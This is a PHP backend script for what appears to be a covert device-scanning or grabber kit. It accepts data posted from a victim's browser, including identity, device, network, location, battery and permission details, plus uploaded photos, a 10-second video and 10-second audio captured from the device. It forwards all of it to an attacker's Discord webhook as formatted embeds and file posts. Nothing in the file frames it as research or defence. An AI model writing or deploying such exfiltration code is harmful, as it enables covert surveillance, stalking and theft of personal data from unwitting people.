<?php
// Enable error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Discord webhook URL
define('DISCORD_WEBHOOK', 'YOUR_DISCORD_WEBHOOK_URL');

// Function to send embed to Discord
function sendToDiscord($data) {
    $ch = curl_init(DISCORD_WEBHOOK);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Function to send file to Discord
function sendFileToDiscord($file, $filename, $content) {
    $ch = curl_init(DISCORD_WEBHOOK);
    curl_setopt($ch, CURLOPT_POST, 1);
    
    $cfile = new CURLFile($file, mime_content_type($file), $filename);
    $data = [
        'file' => $cfile,
        'content' => $content
    ];
    
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Process incoming data
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Check if file upload
    if (isset($_FILES['file'])) {
        $file = $_FILES['file']['tmp_name'];
        $filename = $_FILES['file']['name'];
        $data = json_decode($_POST['data'], true);
        
        // Determine content based on file type
        if (strpos($filename, 'photo') !== false) {
            $content = "📸 Photo {$data['sequence']}/10 from {$data['scanData']['device']['brand']} {$data['scanData']['device']['model']}";
        } elseif (strpos($filename, 'video') !== false) {
            $content = "🎥 10s Video (90FPS) from {$data['scanData']['device']['brand']} {$data['scanData']['device']['model']}";
        } else {
            $content = "🎤 10s Audio from {$data['scanData']['device']['brand']} {$data['scanData']['device']['model']}";
        }
        
        // Send file to Discord
        $result = sendFileToDiscord($file, $filename, $content);
        echo json_encode(['status' => 'success', 'message' => 'File sent to Discord']);
        
    } else {
        // Get JSON data
        $json = file_get_contents('php://input');
        $data = json_decode($json, true);
        
        if ($data) {
            // Create Discord embed
            $embed = [
                'title' => isset($data['scanComplete']) ? '✅ Scan Completed' : 
                          (isset($data['scanError']) ? '❌ Scan Failed' : '🔍 Scan Started'),
                'color' => isset($data['scanComplete']) ? 0x00ff00 : 
                          (isset($data['scanError']) ? 0xff0000 : 0x3498db),
                'timestamp' => date('c'),
                'fields' => []
            ];
            
            // Add scan data fields
            $categories = [
                'identity' => '👤 Identity',
                'device' => '🖥️ Device',
                'browser' => '🌐 Browser',
                'network' => '📶 Network',
                'location' => '🧭 Location',
                'battery' => '🔋 Battery',
                'permissions' => '🔐 Permissions'
            ];
            
            foreach ($categories as $category => $title) {
                if (isset($data[$category])) {
                    $fields = [];
                    foreach ($data[$category] as $key => $value) {
                        if (is_array($value)) {
                            $value = json_encode($value, JSON_PRETTY_PRINT);
                        }
                        $fields[] = "**{$key}:** `{$value}`";
                    }
                    
                    $embed['fields'][] = [
                        'name' => $title,
                        'value' => implode("\n", $fields),
                        'inline' => false
                    ];
                }
            }
            
            // Add error if exists
            if (isset($data['scanError'])) {
                $embed['fields'][] = [
                    'name' => 'Error',
                    'value' => "```\n{$data['scanError']}\n```",
                    'inline' => false
                ];
            }
            
            // Add scan status
            if (isset($data['scanComplete'])) {
                $embed['fields'][] = [
                    'name' => 'Media Collected',
                    'value' => "10 photos\n10s video (90FPS)\n10s audio",
                    'inline' => false
                ];
            }
            
            // Send to Discord
            $result = sendToDiscord(['embeds' => [$embed]]);
            echo json_encode(['status' => 'success', 'message' => 'Data sent to Discord']);
        } else {
            http_response_code(400);
            echo json_encode(['status' => 'error', 'message' => 'Invalid data']);
        }
    }
} else {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
}
?>
